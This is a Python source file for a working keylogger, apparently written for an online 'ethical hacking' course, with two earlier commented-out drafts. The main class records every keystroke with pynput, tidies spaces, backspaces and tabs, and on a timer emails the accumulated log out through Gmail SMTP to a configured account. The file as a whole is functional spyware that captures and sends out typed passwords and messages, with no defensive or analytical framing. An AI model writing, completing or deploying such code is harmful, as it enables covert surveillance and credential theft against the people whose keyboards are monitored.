#!/usr/bin/env python
import pynput.keyboard
import threading
import smtplib
# useful questions that contain good updates to the code like adding backspace and capital letters way more smoothly
# https://www.udemy.com/course/learn-python-and-ethical-hacking-from-scratch/learn/lecture/10524904#questions/5552370
# https://www.udemy.com/course/learn-python-and-ethical-hacking-from-scratch/learn/lecture/10524904#questions/7301708


class Keylogger:

    def __init__(self, email, password, time_interval=15):
        self.log = "Keylogger Started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                # instead of printing key.space when the user enter a space is just prints the space " "
                current_key = " "
            elif key == key.backspace:
                current_key = "\b"     # fixes that backspace issue
            elif key == key.shift:
                current_key = ""  # just prints that capital letter
            elif key == key.tab:
                current_key = "\t"
            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)

    def report(self):
        print(self.log)
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
# ----------------------------------------------------------------------------------------------------------------------
# Stuck the keylogger code inside of a class
# #!/usr/bin/env python
# import pynput.keyboard
# import threading
#
# log = ""
#
#
# class Keylogger:
#
#     def process_key_press(self, key):
#         global log
#         try:
#             log += str(key.char)
#         except AttributeError:
#             if key == key.space:
#                 # instead of printing key.space when the user enter a space is just prints the space " "
#                 log = log + " "
#             else:
#                 log = log + " " + str(key) + " "
#
#     def report(self):
#         global log
#         print(log)
#         log = ""
#         timer = threading.Timer(5, self.report)
#         timer.start()
#
#     def start(self):
#         keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
#         with keyboard_listener:
#             self.report()
#             keyboard_listener.join()
# ----------------------------------------------------------------------------------------------------------------------
# log = ""
#
#
# def process_key_press(key):
#     global log
#     try:
#         log += str(key.char)
#         print(log)
#     except AttributeError:
#         if key == key.space: # instead of printing key.space when the user enter a space is just prints the space " "
#             log = log + " "
#         else:
#             log = log + " " + str(key) + " "
#
#
# def report():
#     global log
#     print(log)
#     log = ""
#     timer = threading.Timer(5, report)
#     timer.start()
#
#
# keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
# with keyboard_listener:
#     report()
#     keyboard_listener.join()


